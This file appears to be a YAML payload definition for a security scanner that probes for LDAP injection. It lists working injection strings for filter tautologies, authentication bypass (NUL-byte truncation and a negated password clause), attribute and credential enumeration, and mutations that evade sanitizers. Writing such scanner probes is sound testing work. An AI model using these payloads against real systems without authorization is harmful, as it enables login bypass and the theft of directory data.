family_id: ldap_injection
description: >-
  LDAP injection curriculum probes (CWE-90). AND/OR filter manipulation,
  wildcard injection, Base DN traversal, and attribute enumeration.
cwe_ids: [90]
owasp_top10:
  - 'A03:2021'
risk_level: high
requires_approval: true
oast_required: false
payloads:
  - id: ldap_filter_tautology
    template: "*)(|(uid=*"
    confidence: suspected
    notes: LDAP filter tautology; closes existing filter and opens OR with wildcard match-all.
  - id: ldap_wildcard_injection
    template: "*)(&(objectClass=*)"
    confidence: suspected
    notes: Wildcard AND filter injection; enumerates all objectClass entries via blind match.
  - id: ldap_base_traversal
    template: "*)(|(dn=*"
    confidence: suspected
    notes: Base DN traversal; leaks full DN structure through differential filter responses.
  - id: ldap_attribute_enum
    template: "*)(|(cn=*)(sn=*)(mail=*)(ou=*"
    confidence: suspected
    notes: Attribute enumeration probe; wildcard tests multiple common LDAP attribute names.
  - id: ldap_authbypass_nul_truncate
    template: "admin)(uid=*))%00"
    confidence: suspected
    notes: NUL-byte truncation on C-backed LDAP servers; truncates the trailing password clause so the uid-only predicate matches.
  - id: ldap_notpassword_bypass
    template: "admin)(!(userPassword=ZZZ))"
    confidence: suspected
    notes: AND-NOT tautology; matches any entry whose password differs from the literal ZZZ, bypassing auth without guessing credentials.
  - id: ldap_description_field_enum
    template: "*)(description=*pass*"
    confidence: suspected
    notes: Enumerates description/info attributes where administrators misuse free-text fields to stash plaintext credentials.
mutations:
  - name: case_flip
    description: Flip case of LDAP attribute names to probe case-insensitive filter handling.
  - name: whitespace_alt
    description: Insert alternate whitespace inside the filter to bypass naive input sanitizers.
encodings:
  - name: identity
    stages: []
    description: Raw LDAP filter string in search-form context.
  - name: url_only
    stages: [url]
    description: URL-encoded for LDAP filters in query-string parameters.
